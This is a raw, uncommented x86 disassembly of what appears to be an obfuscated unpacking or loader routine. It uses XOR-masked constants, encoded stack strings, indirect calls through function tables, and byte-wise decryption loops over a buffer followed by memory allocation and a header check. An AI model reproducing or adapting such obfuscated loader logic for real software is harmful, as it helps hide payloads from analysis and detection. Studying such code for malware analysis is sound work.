  41d790:	push   edx
  41d791:	mov    edx,DWORD PTR [ebp+0x8]
  41d794:	mov    edx,DWORD PTR [edx+0x18c]
  41d79a:	mov    edx,DWORD PTR [edx]
  41d79c:	add    edx,DWORD PTR [eax+0x88]
  41d7a2:	push   0x4
  41d7a4:	push   DWORD PTR [eax+0x8c]
  41d7aa:	push   edx
  41d7ab:	call   DWORD PTR [ecx+0x1c]
  41d7ae:	push   DWORD PTR [ebp+0x8]
  41d7b1:	mov    edi,DWORD PTR [ebp+0x8]
  41d7b4:	mov    eax,DWORD PTR [ebp+0x8]
  41d7b7:	mov    edx,DWORD PTR [eax+0x1b8]
  41d7bd:	mov    DWORD PTR [ebp-0x68],0xe080f00
  41d7c4:	mov    DWORD PTR [ebp-0x64],0x50c011f
  41d7cb:	mov    WORD PTR [ebp-0x60],0x7c3d
  41d7d1:	mov    DWORD PTR [ebp-0x90],0x43f0f25
  41d7db:	mov    DWORD PTR [ebp-0x8c],0x3d0e1d
  41d7e5:	mov    DWORD PTR [ebp-0x88],0x221d040c
  41d7ef:	mov    DWORD PTR [ebp-0x84],0xe190109
  41d7f9:	mov    DWORD PTR [ebp-0x80],0x7c3d1f05
  41d800:	mov    DWORD PTR [ebp-0x7c],0x43f0f25
  41d807:	mov    DWORD PTR [ebp-0x78],0x3d0e1d
  41d80e:	mov    DWORD PTR [ebp-0x74],0x221d040c
  41d815:	mov    DWORD PTR [ebp-0x70],0xe190109
  41d81c:	mov    DWORD PTR [ebp-0x6c],0x7c2b1f05
  41d823:	call   0x41fafc
  41d828:	push   eax
  41d829:	mov    eax,DWORD PTR [ebp+0x8]
  41d82c:	mov    eax,DWORD PTR [eax+0x1a8]
  41d832:	push   DWORD PTR [eax]
  41d834:	call   0x41f79d
  41d839:	test   eax,eax
  41d83b:	jne    0x41d88d
  41d83d:	mov    eax,DWORD PTR [ebp+0x8]
  41d840:	mov    eax,DWORD PTR [eax+0x1d8]
  41d846:	mov    edi,DWORD PTR [ebp+0x8]
  41d849:	add    eax,0x4
  41d84c:	mov    DWORD PTR [ebp-0x24],eax
  41d84f:	mov    eax,DWORD PTR [ebp+0x8]
  41d852:	mov    edx,DWORD PTR [eax+0x1b8]
  41d858:	call   0x41fafc
  41d85d:	push   eax
  41d85e:	mov    eax,DWORD PTR [ebp-0x24]
  41d861:	call   DWORD PTR [eax]
  41d863:	test   eax,eax
  41d865:	jne    0x41d88d
  41d867:	mov    eax,DWORD PTR [ebp+0x8]
  41d86a:	mov    eax,DWORD PTR [eax+0x1d8]
  41d870:	mov    edi,DWORD PTR [ebp+0x8]
  41d873:	add    eax,0x10
  41d876:	mov    DWORD PTR [ebp-0x24],eax
  41d879:	mov    eax,DWORD PTR [ebp+0x8]
  41d87c:	mov    edx,DWORD PTR [eax+0x1b8]
  41d882:	call   0x41fafc
  41d887:	push   eax
  41d888:	mov    eax,DWORD PTR [ebp-0x24]
  41d88b:	call   DWORD PTR [eax]
  41d88d:	mov    eax,DWORD PTR [ebp-0x14]
  41d890:	mov    ecx,DWORD PTR [ebp-0x28]
  41d893:	xor    eax,ebx
  41d895:	add    eax,esi
  41d897:	cmp    eax,ecx
  41d899:	je     0x41da18
  41d89f:	mov    eax,DWORD PTR [ebp-0x18]
  41d8a2:	xor    eax,ebx
  41d8a4:	mov    ecx,0xffcd8d1e
  41d8a9:	sub    ecx,eax
  41d8ab:	add    ecx,DWORD PTR [ebp-0x28]
  41d8ae:	mov    eax,DWORD PTR [ebp-0x8]
  41d8b1:	cmp    eax,ecx
  41d8b3:	ja     0x41da18
  41d8b9:	mov    DWORD PTR [ebp-0x20],0x0
  41d8c0:	push   DWORD PTR [ebp+0x8]
  41d8c3:	mov    edi,DWORD PTR [ebp+0x8]
  41d8c6:	mov    eax,DWORD PTR [ebp+0x8]
  41d8c9:	mov    edx,DWORD PTR [eax+0x1b4]
  41d8cf:	call   0x41fafc
  41d8d4:	push   eax
  41d8d5:	mov    eax,DWORD PTR [ebp+0x8]
  41d8d8:	mov    eax,DWORD PTR [eax+0x1a8]
  41d8de:	push   DWORD PTR [eax]
  41d8e0:	call   0x41f79d
  41d8e5:	mov    ecx,DWORD PTR [ebp+0x8]
  41d8e8:	mov    ecx,DWORD PTR [ecx+0x19c]
  41d8ee:	mov    DWORD PTR [ecx],eax
  41d8f0:	mov    eax,DWORD PTR [ebp+0x8]
  41d8f3:	mov    edi,DWORD PTR [eax+0x1d8]
  41d8f9:	mov    esi,DWORD PTR [ebp+0x8]
  41d8fc:	xor    eax,eax
  41d8fe:	lea    edx,[ebp-0x7c]
  41d901:	call   0x41fb32
  41d906:	push   eax
  41d907:	mov    eax,DWORD PTR [ebp+0x8]
  41d90a:	mov    eax,DWORD PTR [eax+0x19c]
  41d910:	push   DWORD PTR [eax]
  41d912:	call   DWORD PTR [edi+0x8]
  41d915:	mov    DWORD PTR [ebp-0x24],eax
  41d918:	mov    eax,DWORD PTR [ebp+0x8]
  41d91b:	mov    edi,DWORD PTR [eax+0x1d8]
  41d921:	mov    esi,DWORD PTR [ebp+0x8]
  41d924:	xor    eax,eax
  41d926:	lea    edx,[ebp-0x90]
  41d92c:	call   0x41fb32
  41d931:	push   eax
  41d932:	mov    eax,DWORD PTR [ebp+0x8]
  41d935:	mov    eax,DWORD PTR [eax+0x19c]
  41d93b:	push   DWORD PTR [eax]
  41d93d:	call   DWORD PTR [edi+0x8]
  41d940:	and    DWORD PTR [ebp-0x1c],0x0
  41d944:	mov    eax,DWORD PTR [ebp-0x1c]
  41d947:	and    eax,0x7
  41d94a:	add    eax,0x31
  41d94d:	push   eax
  41d94e:	call   DWORD PTR [ebp-0x24]
  41d951:	test   eax,eax
  41d953:	jne    0x41d95a
  41d955:	and    DWORD PTR [ebp-0x10],eax
  41d958:	jmp    0x41d982
  41d95a:	mov    eax,DWORD PTR [ebp+0x8]
  41d95d:	mov    edi,DWORD PTR [eax+0x1d8]
  41d963:	mov    esi,DWORD PTR [ebp+0x8]
  41d966:	xor    eax,eax
  41d968:	lea    edx,[ebp-0x68]
  41d96b:	call   0x41fb32
  41d970:	push   eax
  41d971:	mov    eax,DWORD PTR [ebp+0x8]
  41d974:	mov    eax,DWORD PTR [eax+0x198]
  41d97a:	push   DWORD PTR [eax]
  41d97c:	call   DWORD PTR [edi+0x8]
  41d97f:	mov    DWORD PTR [ebp-0x10],eax
  41d982:	inc    DWORD PTR [ebp-0x1c]
  41d985:	cmp    DWORD PTR [ebp-0x1c],0x10
  41d989:	jb     0x41d944
  41d98b:	mov    eax,DWORD PTR [ebp-0x18]
  41d98e:	mov    esi,DWORD PTR [ebp+0x8]
  41d991:	xor    eax,ebx
  41d993:	mov    edi,0x3272e2
  41d998:	add    eax,edi
  41d99a:	lea    edx,[ebp-0xe4]
  41d9a0:	call   0x41fb32
  41d9a5:	push   eax
  41d9a6:	mov    eax,DWORD PTR [ebp-0x14]
  41d9a9:	mov    esi,DWORD PTR [ebp+0x8]
  41d9ac:	xor    eax,ebx
  41d9ae:	add    eax,edi
  41d9b0:	lea    edx,[ebp-0x104]
  41d9b6:	call   0x41fb32
  41d9bb:	push   eax
  41d9bc:	call   DWORD PTR [ebp-0x10]
  41d9bf:	mov    ecx,DWORD PTR [ebp-0x14]
  41d9c2:	xor    ecx,ebx
  41d9c4:	add    ecx,edi
  41d9c6:	cmp    ecx,eax
  41d9c8:	jne    0x41d9d1
  41d9ca:	mov    DWORD PTR [ebp-0x20],0x1
  41d9d1:	mov    eax,DWORD PTR [ebp-0x18]
  41d9d4:	mov    ecx,DWORD PTR [ebp-0x8]
  41d9d7:	xor    eax,ebx
  41d9d9:	lea    eax,[eax+ecx*1+0x3272e2]
  41d9e0:	mov    DWORD PTR [ebp-0x8],eax
  41d9e3:	mov    eax,DWORD PTR [ebp-0x20]
  41d9e6:	test   eax,eax
  41d9e8:	je     0x41d9fc
  41d9ea:	mov    eax,DWORD PTR [ebp-0x18]
  41d9ed:	mov    ecx,DWORD PTR [ebp-0x38]
  41d9f0:	xor    eax,ebx
  41d9f2:	lea    eax,[eax+ecx*1+0x3272e2]
  41d9f9:	mov    DWORD PTR [ebp-0x38],eax
  41d9fc:	mov    eax,DWORD PTR [ebp-0x18]
  41d9ff:	xor    eax,ebx
  41da01:	mov    ecx,0xffcd8d1e
  41da06:	sub    ecx,eax
  41da08:	add    ecx,DWORD PTR [ebp-0x28]
  41da0b:	mov    eax,DWORD PTR [ebp-0x8]
  41da0e:	cmp    eax,ecx
  41da10:	jbe    0x41d8b9
  41da16:	mov    esi,edi
  41da18:	mov    eax,DWORD PTR [ebp-0x38]
  41da1b:	mov    ecx,DWORD PTR [ebp-0x8]
  41da1e:	cmp    ecx,eax
  41da20:	jne    0x41da33
  41da22:	push   DWORD PTR [ebp+0x8]
  41da25:	lea    eax,[ebp-0x3c]
  41da28:	push   eax
  41da29:	call   0x4205aa
  41da2e:	mov    DWORD PTR [ebp-0x2c],eax
  41da31:	jmp    0x41da3f
  41da33:	mov    eax,DWORD PTR [ebp-0x2c]
  41da36:	mov    ecx,DWORD PTR [ebp-0x18]
  41da39:	xor    ecx,ebx
  41da3b:	add    ecx,esi
  41da3d:	xor    DWORD PTR [eax],ecx
  41da3f:	mov    eax,DWORD PTR [ebp-0x14]
  41da42:	mov    ecx,DWORD PTR [ebp-0x2c]
  41da45:	xor    eax,ebx
  41da47:	add    eax,esi
  41da49:	cmp    eax,ecx
  41da4b:	je     0x41e1c5
  41da51:	mov    eax,DWORD PTR [ebp-0x14]
  41da54:	mov    ecx,DWORD PTR [ebp-0x3c]
  41da57:	xor    eax,ebx
  41da59:	add    eax,esi
  41da5b:	cmp    eax,ecx
  41da5d:	je     0x41e1c5
  41da63:	mov    eax,DWORD PTR [ebp-0x14]
  41da66:	xor    eax,ebx
  41da68:	add    eax,esi
  41da6a:	jmp    0x41da88
  41da6c:	mov    edi,DWORD PTR [ebp-0x2c]
  41da6f:	mov    cl,al
  41da71:	and    cl,0x1f
  41da74:	or     dl,0xff
  41da77:	sub    dl,cl
  41da79:	add    BYTE PTR [edi+eax*1],dl
  41da7c:	mov    ecx,DWORD PTR [ebp-0x18]
  41da7f:	xor    ecx,ebx
  41da81:	lea    eax,[eax+ecx*1+0x3272e2]
  41da88:	mov    ecx,DWORD PTR [ebp-0x3c]
  41da8b:	cmp    eax,ecx
  41da8d:	jb     0x41da6c
  41da8f:	mov    eax,DWORD PTR [ebp-0x3c]
  41da92:	mov    DWORD PTR [ebp-0x28],eax
  41da95:	mov    eax,DWORD PTR [ebp-0x2c]
  41da98:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41da9f:	mov    DWORD PTR [ebp-0xbc],eax
  41daa5:	mov    edi,0xf89c8584
  41daaa:	mov    DWORD PTR [ebp-0x30],edi
  41daad:	mov    eax,DWORD PTR [ebp-0x38]
  41dab0:	xor    eax,ebx
  41dab2:	add    eax,esi
  41dab4:	mov    DWORD PTR [ebp-0xc],eax
  41dab7:	mov    eax,DWORD PTR [ebp-0x38]
  41daba:	xor    eax,ebx
  41dabc:	add    eax,esi
  41dabe:	mov    DWORD PTR [ebp-0x8],eax
  41dac1:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41dac8:	mov    DWORD PTR [ebp-0x54],0xf89c85be
  41dacf:	mov    eax,DWORD PTR [ebp-0x38]
  41dad2:	mov    ecx,DWORD PTR [ebp-0x28]
  41dad5:	xor    eax,ebx
  41dad7:	add    eax,esi
  41dad9:	cmp    ecx,eax
  41dadb:	je     0x41dcda
  41dae1:	jmp    0x41dcb6
  41dae6:	mov    ecx,DWORD PTR [ebp-0xc]
  41dae9:	mov    eax,DWORD PTR [ebp-0x28]
  41daec:	sub    eax,ecx
  41daee:	mov    ecx,DWORD PTR [ebp-0x48]
  41daf1:	xor    ecx,ebx
  41daf3:	add    ecx,esi
  41daf5:	xor    edx,edx
  41daf7:	div    ecx
  41daf9:	mov    DWORD PTR [ebp-0x8],eax
  41dafc:	mov    eax,DWORD PTR [ebp-0x54]
  41daff:	mov    ecx,DWORD PTR [ebp-0x8]
  41db02:	xor    eax,ebx
  41db04:	add    eax,esi
  41db06:	cmp    ecx,eax
  41db08:	jbe    0x41db14
  41db0a:	mov    eax,DWORD PTR [ebp-0x54]
  41db0d:	xor    eax,ebx
  41db0f:	add    eax,esi
  41db11:	mov    DWORD PTR [ebp-0x8],eax
  41db14:	mov    eax,DWORD PTR [ebp-0x48]
  41db17:	mov    ecx,DWORD PTR [ebp-0x8]
  41db1a:	xor    eax,ebx
  41db1c:	add    eax,esi
  41db1e:	imul   eax,ecx
  41db21:	mov    DWORD PTR [ebp-0x8],eax
  41db24:	mov    eax,DWORD PTR [ebp-0x38]
  41db27:	mov    ecx,DWORD PTR [ebp-0x8]
  41db2a:	xor    eax,ebx
  41db2c:	add    eax,esi
  41db2e:	cmp    ecx,eax
  41db30:	je     0x41dca4
  41db36:	mov    eax,DWORD PTR [ebp-0x8]
  41db39:	mov    DWORD PTR [ebp-0x10],eax
  41db3c:	mov    eax,DWORD PTR [ebp-0xc]
  41db3f:	add    eax,DWORD PTR [ebp-0xbc]
  41db45:	mov    DWORD PTR [ebp-0x24],0xf89c8585
  41db4c:	mov    DWORD PTR [ebp-0x20],edi
  41db4f:	mov    DWORD PTR [ebp-0xa8],0xf89c85bb
  41db59:	mov    DWORD PTR [ebp-0x8],eax
  41db5c:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  41db63:	mov    DWORD PTR [ebp-0x1c],edi
  41db66:	mov    eax,DWORD PTR [ebp-0x24]
  41db69:	xor    eax,ebx
  41db6b:	add    eax,esi
  41db6d:	jmp    0x41dc63
  41db72:	mov    DWORD PTR [ebp-0xb0],0xf89c85b3
  41db7c:	mov    DWORD PTR [ebp-0xb8],0xf89c85a9
  41db86:	mov    eax,DWORD PTR [ebp-0x1c]
  41db89:	mov    ecx,DWORD PTR [ebp-0x44]
  41db8c:	xor    eax,ebx
  41db8e:	add    eax,esi
  41db90:	imul   eax,ecx
  41db93:	mov    ecx,DWORD PTR [ebp-0x8]
  41db96:	mov    al,BYTE PTR [eax+ecx*1]
  41db99:	mov    BYTE PTR [ebp-0x2],al
  41db9c:	mov    eax,DWORD PTR [ebp-0x1c]
  41db9f:	mov    ecx,DWORD PTR [ebp-0x44]
  41dba2:	xor    eax,ebx
  41dba4:	add    eax,esi
  41dba6:	imul   eax,ecx
  41dba9:	mov    ecx,DWORD PTR [ebp-0xa8]
  41dbaf:	xor    ecx,ebx
  41dbb1:	add    eax,ecx
  41dbb3:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbb6:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41dbbe:	mov    ecx,DWORD PTR [ebp-0xb0]
  41dbc4:	xor    ecx,ebx
  41dbc6:	lea    eax,[ecx+eax*1+0x3272e2]
  41dbcd:	movzx  ecx,BYTE PTR [ebp-0x2]
  41dbd1:	xor    ecx,eax
  41dbd3:	mov    BYTE PTR [ebp-0x2],cl
  41dbd6:	mov    al,BYTE PTR [ebp-0x2]
  41dbd9:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dbdc:	mov    edx,DWORD PTR [ebp-0x44]
  41dbdf:	xor    ecx,ebx
  41dbe1:	add    ecx,esi
  41dbe3:	imul   ecx,edx
  41dbe6:	mov    edx,DWORD PTR [ebp-0x8]
  41dbe9:	mov    BYTE PTR [ecx+edx*1],al
  41dbec:	mov    eax,DWORD PTR [ebp-0x1c]
  41dbef:	mov    ecx,DWORD PTR [ebp-0x44]
  41dbf2:	xor    eax,ebx
  41dbf4:	add    eax,esi
  41dbf6:	imul   eax,ecx
  41dbf9:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbfc:	mov    al,BYTE PTR [eax+ecx*1]
  41dbff:	mov    BYTE PTR [ebp-0x2],al
  41dc02:	mov    eax,DWORD PTR [ebp-0x1c]
  41dc05:	mov    ecx,DWORD PTR [ebp-0x44]
  41dc08:	xor    eax,ebx
  41dc0a:	add    eax,esi
  41dc0c:	imul   eax,ecx
  41dc0f:	mov    ecx,DWORD PTR [ebp-0x20]
  41dc12:	xor    ecx,ebx
  41dc14:	add    eax,ecx
  41dc16:	mov    ecx,DWORD PTR [ebp-0x8]
  41dc19:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41dc21:	mov    ecx,DWORD PTR [ebp-0xb8]
  41dc27:	xor    ecx,ebx
  41dc29:	lea    eax,[ecx+eax*1+0x3272e2]
  41dc30:	movzx  ecx,BYTE PTR [ebp-0x2]
  41dc34:	xor    ecx,eax
  41dc36:	mov    BYTE PTR [ebp-0x2],cl
  41dc39:	mov    al,BYTE PTR [ebp-0x2]
  41dc3c:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dc3f:	mov    edx,DWORD PTR [ebp-0x44]
  41dc42:	xor    ecx,ebx
  41dc44:	add    ecx,esi
  41dc46:	imul   ecx,edx
  41dc49:	mov    edx,DWORD PTR [ebp-0x8]
  41dc4c:	mov    BYTE PTR [ecx+edx*1],al
  41dc4f:	mov    eax,DWORD PTR [ebp-0x34]
  41dc52:	mov    ecx,DWORD PTR [ebp-0x20]
  41dc55:	xor    eax,ebx
  41dc57:	xor    ecx,ebx
  41dc59:	add    eax,esi
  41dc5b:	add    ecx,esi
  41dc5d:	imul   eax,ecx
  41dc60:	add    eax,DWORD PTR [ebp-0x44]
  41dc63:	mov    DWORD PTR [ebp-0x44],eax
  41dc66:	mov    eax,DWORD PTR [ebp-0x44]
  41dc69:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc6c:	cmp    ecx,eax
  41dc6e:	jb     0x41db72
  41dc74:	mov    eax,DWORD PTR [ebp-0x20]
  41dc77:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc7a:	xor    eax,ebx
  41dc7c:	add    eax,esi
  41dc7e:	imul   eax,ecx
  41dc81:	mov    ecx,DWORD PTR [ebp-0x24]
  41dc84:	xor    ecx,ebx
  41dc86:	add    ecx,esi
  41dc88:	or     eax,ecx
  41dc8a:	mov    ecx,DWORD PTR [ebp-0x30]
  41dc8d:	xor    ecx,ebx
  41dc8f:	add    eax,ecx
  41dc91:	mov    ecx,DWORD PTR [ebp-0x30]
  41dc94:	xor    ecx,ebx
  41dc96:	add    eax,ecx
  41dc98:	mov    ecx,DWORD PTR [ebp-0xc]
  41dc9b:	lea    eax,[eax+ecx*1+0x64e5c4]
  41dca2:	jmp    0x41dcb3
  41dca4:	mov    eax,DWORD PTR [ebp-0x30]
  41dca7:	mov    ecx,DWORD PTR [ebp-0xc]
  41dcaa:	xor    eax,ebx
  41dcac:	lea    eax,[eax+ecx*1+0x3272e2]
  41dcb3:	mov    DWORD PTR [ebp-0xc],eax
  41dcb6:	mov    eax,DWORD PTR [ebp-0x30]
  41dcb9:	xor    eax,ebx
  41dcbb:	mov    ecx,0xffcd8d1e
  41dcc0:	sub    ecx,eax
  41dcc2:	add    ecx,DWORD PTR [ebp-0x28]
  41dcc5:	mov    eax,DWORD PTR [ebp-0x30]
  41dcc8:	mov    edx,DWORD PTR [ebp-0xc]
  41dccb:	xor    eax,ebx
  41dccd:	add    eax,esi
  41dccf:	imul   eax,edx
  41dcd2:	cmp    eax,ecx
  41dcd4:	jbe    0x41dae6
  41dcda:	mov    eax,DWORD PTR [ebp-0x14]
  41dcdd:	mov    ecx,DWORD PTR [ebp-0x3c]
  41dce0:	mov    eax,DWORD PTR [ebp+0x8]
  41dce3:	mov    edx,DWORD PTR [ebp-0x4c]
  41dce6:	mov    eax,DWORD PTR [eax+0x1d8]
  41dcec:	xor    edx,ebx
  41dcee:	add    edx,esi
  41dcf0:	push   edx
  41dcf1:	mov    edx,DWORD PTR [ebp-0x40]
  41dcf4:	xor    edx,ebx
  41dcf6:	add    edx,esi
  41dcf8:	push   edx
  41dcf9:	push   ecx
  41dcfa:	mov    DWORD PTR [ebp-0x34],ecx
  41dcfd:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd00:	xor    ecx,ebx
  41dd02:	add    ecx,esi
  41dd04:	push   ecx
  41dd05:	call   DWORD PTR [eax+0x14]
  41dd08:	mov    edi,eax
  41dd0a:	mov    eax,DWORD PTR [ebp-0x14]
  41dd0d:	xor    eax,ebx
  41dd0f:	add    eax,esi
  41dd11:	cmp    eax,edi
  41dd13:	je     0x41dd6e
  41dd15:	mov    eax,DWORD PTR [ebp-0x14]
  41dd18:	jmp    0x41dd3b
  41dd1a:	mov    ecx,DWORD PTR [ebp-0x2c]
  41dd1d:	xor    eax,ebx
  41dd1f:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  41dd26:	mov    BYTE PTR [eax+edi*1+0x3272e2],cl
  41dd2d:	mov    ecx,DWORD PTR [ebp-0x18]
  41dd30:	xor    ecx,ebx
  41dd32:	lea    eax,[ecx+eax*1+0x3272e2]
  41dd39:	xor    eax,ebx
  41dd3b:	mov    ecx,DWORD PTR [ebp-0x3c]
  41dd3e:	sub    ecx,esi
  41dd40:	xor    ecx,ebx
  41dd42:	cmp    eax,ecx
  41dd44:	jne    0x41dd1a
  41dd46:	mov    eax,DWORD PTR [ebp+0x8]
  41dd49:	mov    ecx,DWORD PTR [ebp-0x50]
  41dd4c:	mov    eax,DWORD PTR [eax+0x1d8]
  41dd52:	xor    ecx,ebx
  41dd54:	add    ecx,esi
  41dd56:	push   ecx
  41dd57:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd5a:	xor    ecx,ebx
  41dd5c:	add    ecx,esi
  41dd5e:	push   ecx
  41dd5f:	push   DWORD PTR [ebp-0x2c]
  41dd62:	call   DWORD PTR [eax+0x18]
  41dd65:	mov    eax,DWORD PTR [ebp-0x34]
  41dd68:	mov    DWORD PTR [ebp-0x2c],edi
  41dd6b:	mov    DWORD PTR [ebp-0x3c],eax
  41dd6e:	mov    eax,DWORD PTR [ebp-0x2c]
  41dd71:	mov    DWORD PTR [ebp-0x10],eax
  41dd74:	mov    eax,DWORD PTR [ebp-0x18]
  41dd77:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd7a:	xor    eax,ebx
  41dd7c:	add    eax,esi
  41dd7e:	mov    DWORD PTR [ebp-0x5c],0x3d142c14
  41dd85:	mov    DWORD PTR [ebp-0x58],0x27143f14
  41dd8c:	jmp    0x41ddbf
  41dd8e:	mov    edx,DWORD PTR [ebp-0x10]
  41dd91:	mov    edi,ecx
  41dd93:	xor    edi,ebx
  41dd95:	mov    cl,BYTE PTR [ebp+edi*1+0x327286]
  41dd9c:	movsx  edx,BYTE PTR [edi+edx*1+0x3272e2]
  41dda4:	xor    cl,0x74
  41dda7:	sub    cl,0x8
  41ddaa:	movzx  ecx,cl
  41ddad:	cmp    edx,ecx
  41ddaf:	jne    0x41ddc9
  41ddb1:	mov    ecx,DWORD PTR [ebp-0x18]
  41ddb4:	xor    ecx,ebx
  41ddb6:	lea    ecx,[ecx+edi*1+0x3272e2]
  41ddbd:	xor    ecx,ebx
  41ddbf:	cmp    ecx,0xf89c85bd
  41ddc5:	jne    0x41dd8e
  41ddc7:	jmp    0x41ddd0
  41ddc9:	mov    eax,DWORD PTR [ebp-0x14]
  41ddcc:	xor    eax,ebx
  41ddce:	add    eax,esi
  41ddd0:	mov    ecx,DWORD PTR [ebp-0x14]
  41ddd3:	xor    ecx,ebx
  41ddd5:	add    ecx,esi
  41ddd7:	cmp    ecx,eax
  41ddd9:	je     0x41df4f
  41dddf:	mov    eax,DWORD PTR [ebp-0x10]
  41dde2:	mov    eax,DWORD PTR [eax+0x8]
  41dde5:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  41ddec:	mov    DWORD PTR [ebp-0x40],0xf89cc316
  41ddf3:	mov    DWORD PTR [ebp-0x48],0xf89cb585
  41ddfa:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  41de01:	mov    DWORD PTR [ebp-0x20],eax
  41de04:	mov    eax,DWORD PTR [ebp+0x8]
  41de07:	mov    ecx,DWORD PTR [ebp-0x24]
  41de0a:	xor    ecx,ebx
  41de0c:	add    ecx,esi
  41de0e:	push   ecx
  41de0f:	mov    ecx,DWORD PTR [ebp-0x48]
  41de12:	mov    eax,DWORD PTR [eax+0x1d8]
  41de18:	xor    ecx,ebx
  41de1a:	add    ecx,esi
  41de1c:	push   ecx
  41de1d:	mov    ecx,DWORD PTR [ebp-0x40]
  41de20:	xor    ecx,ebx
  41de22:	add    ecx,esi
  41de24:	push   ecx
  41de25:	mov    ecx,DWORD PTR [ebp-0xc]
  41de28:	xor    ecx,ebx
  41de2a:	add    ecx,esi
  41de2c:	push   ecx
  41de2d:	call   DWORD PTR [eax+0x14]
  41de30:	mov    edi,eax
  41de32:	mov    eax,DWORD PTR [ebp+0x8]
  41de35:	mov    ecx,DWORD PTR [ebp-0x24]
  41de38:	mov    eax,DWORD PTR [eax+0x1d8]
  41de3e:	xor    ecx,ebx
  41de40:	add    ecx,esi
  41de42:	push   ecx
  41de43:	mov    ecx,DWORD PTR [ebp-0x48]
  41de46:	xor    ecx,ebx
  41de48:	add    ecx,esi
  41de4a:	push   ecx
  41de4b:	mov    ecx,DWORD PTR [ebp-0xc]
  41de4e:	push   DWORD PTR [ebp-0x20]
  41de51:	xor    ecx,ebx
  41de53:	add    ecx,esi
  41de55:	push   ecx
  41de56:	call   DWORD PTR [eax+0x14]
  41de59:	mov    ecx,DWORD PTR [ebp-0xc]
  41de5c:	xor    ecx,ebx
  41de5e:	add    ecx,esi
  41de60:	mov    DWORD PTR [ebp-0x24],eax
  41de63:	cmp    ecx,edi
  41de65:	je     0x41e1f2
  41de6b:	mov    ecx,DWORD PTR [ebp-0xc]
  41de6e:	xor    ecx,ebx
  41de70:	add    ecx,esi
  41de72:	cmp    ecx,eax
  41de74:	je     0x41e1f2
  41de7a:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  41de81:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41de88:	mov    ecx,DWORD PTR [ebp-0x40]
  41de8b:	xor    cl,0x9b
  41de8e:	sub    cl,0x1e
  41de91:	mov    BYTE PTR [edi],cl
  41de93:	mov    ecx,DWORD PTR [ebp-0xc]
  41de96:	xor    cl,0x9b
  41de99:	sub    cl,0x1e
  41de9c:	mov    BYTE PTR [edi+0x1],cl
  41de9f:	mov    ecx,DWORD PTR [ebp-0x4c]
  41dea2:	xor    cl,0x9b
  41dea5:	sub    cl,0x1e
  41dea8:	mov    BYTE PTR [edi+0x2],cl
  41deab:	and    DWORD PTR [ebp-0xb4],0x0
  41deb2:	and    DWORD PTR [ebp-0xa4],0x0
  41deb9:	lea    ecx,[ebp-0xa4]
  41debf:	push   ecx
  41dec0:	push   DWORD PTR [ebp-0x20]
  41dec3:	push   eax
  41dec4:	lea    eax,[ebp-0xb4]
  41deca:	push   eax
  41decb:	mov    eax,DWORD PTR [ebp-0x10]
  41dece:	push   DWORD PTR [eax+0xc]
  41ded1:	mov    eax,DWORD PTR [ebp-0x2c]
  41ded4:	add    eax,0x10
  41ded7:	push   eax
  41ded8:	push   edi
  41ded9:	call   0x41d223
  41dede:	mov    DWORD PTR [ebp-0x40],eax
  41dee1:	mov    eax,DWORD PTR [ebp+0x8]
  41dee4:	mov    ecx,DWORD PTR [ebp-0x50]
  41dee7:	mov    eax,DWORD PTR [eax+0x1d8]
  41deed:	xor    ecx,ebx
  41deef:	add    ecx,esi
  41def1:	push   ecx
  41def2:	mov    ecx,DWORD PTR [ebp-0xc]
  41def5:	xor    ecx,ebx
  41def7:	add    ecx,esi
  41def9:	push   ecx
  41defa:	push   edi
  41defb:	call   DWORD PTR [eax+0x18]
  41defe:	mov    eax,DWORD PTR [ebp-0x40]
  41df01:	add    eax,0xffcd8d1e
  41df06:	xor    eax,ebx
  41df08:	cmp    eax,0xf89c8585
  41df0d:	mov    eax,DWORD PTR [ebp+0x8]
  41df10:	mov    eax,DWORD PTR [eax+0x1d8]
  41df16:	mov    ecx,DWORD PTR [ebp-0x50]
  41df19:	jne    0x41df3c
  41df1b:	xor    ecx,ebx
  41df1d:	add    ecx,esi
  41df1f:	push   ecx
  41df20:	mov    ecx,DWORD PTR [ebp-0xc]
  41df23:	xor    ecx,ebx
  41df25:	add    ecx,esi
  41df27:	push   ecx
  41df28:	push   DWORD PTR [ebp-0x2c]
  41df2b:	call   DWORD PTR [eax+0x18]
  41df2e:	mov    eax,DWORD PTR [ebp-0x24]
  41df31:	mov    DWORD PTR [ebp-0x2c],eax
  41df34:	mov    eax,DWORD PTR [ebp-0x20]
  41df37:	mov    DWORD PTR [ebp-0x3c],eax
  41df3a:	jmp    0x41df4f
  41df3c:	xor    ecx,ebx
  41df3e:	add    ecx,esi
  41df40:	push   ecx
  41df41:	mov    ecx,DWORD PTR [ebp-0xc]
  41df44:	xor    ecx,ebx
  41df46:	add    ecx,esi
  41df48:	push   ecx
  41df49:	push   DWORD PTR [ebp-0x24]
  41df4c:	call   DWORD PTR [eax+0x18]
  41df4f:	mov    eax,DWORD PTR [ebp-0x3c]
  41df52:	mov    DWORD PTR [ebp-0x38],eax
  41df55:	mov    eax,DWORD PTR [ebp-0x2c]
  41df58:	mov    DWORD PTR [ebp-0x28],0xf89c8585
  41df5f:	mov    DWORD PTR [ebp-0x40],eax
  41df62:	mov    edi,0xf89c8584
  41df67:	mov    DWORD PTR [ebp-0x30],edi
  41df6a:	mov    eax,DWORD PTR [ebp-0x28]
  41df6d:	xor    eax,ebx
  41df6f:	add    eax,esi
  41df71:	mov    DWORD PTR [ebp-0xc],eax
  41df74:	mov    eax,DWORD PTR [ebp-0x28]
  41df77:	xor    eax,ebx
  41df79:	add    eax,esi
  41df7b:	mov    DWORD PTR [ebp-0x10],eax
